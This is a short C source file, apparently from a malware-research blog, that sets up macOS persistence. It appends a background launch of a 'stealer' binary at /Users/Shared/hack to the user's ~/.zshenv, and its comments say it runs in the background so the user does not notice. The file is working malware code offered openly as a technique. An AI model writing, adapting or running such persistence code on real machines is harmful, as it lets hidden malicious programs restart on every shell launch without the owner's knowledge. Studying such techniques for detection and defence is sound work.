/*
 * pers.c
 * macOS persistence via ~/.zshenv
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2026/01/31/malware-mac-persistence-2.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
  // path to the target shell config
  char shell_config[512];
  char *home = getenv("HOME");
  snprintf(shell_config, sizeof(shell_config), "%s/.zshenv", home);

  // the command we want to persist (our stealer)
  // we use '&' to run it in the background so the user doesn't notice a lag
  char *malicious_cmd = "\n/Users/Shared/hack &\n";

  // check if the command is already there to avoid duplicates
  FILE *f = fopen(shell_config, "r");
  char line[1024];
  int already_infected = 0;
  if (f) {
    while (fgets(line, sizeof(line), f)) {
      if (strstr(line, "/Users/Shared/hack")) {
        already_infected = 1;
        break;
      }
    }
    fclose(f);
  }

  // infect the file
  if (!already_infected) {
    f = fopen(shell_config, "a"); // open for appending
    if (f) {
      fprintf(f, "%s", malicious_cmd);
      fclose(f);
      printf("shell environment hijacked: %s\n", shell_config);
    }
  } else {
    printf("file already infected.\n");
  }

  return 0;
}